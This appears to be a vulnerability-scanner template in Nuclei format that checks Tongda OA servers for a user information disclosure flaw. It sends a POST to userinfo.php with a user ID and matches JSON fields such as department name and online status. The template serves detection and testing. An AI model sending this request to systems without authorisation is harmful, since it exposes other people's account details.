id: tongda-session-disclosure

info:
  name: Tongda User Session Disclosure
  author: ritikchaddha
  severity: medium
  reference:
    - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
  tags: tongda,disclosure

requests:
  - method: POST
    path:
      - "{{BaseURL}}/general/userinfo.php?UID=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"dept_name":"'
          - '"online_flag":'
        condition: and

      - type: word
        part: header
        words:
          - "application/json"
        condition: and

      - type: status
        status:
          - 200
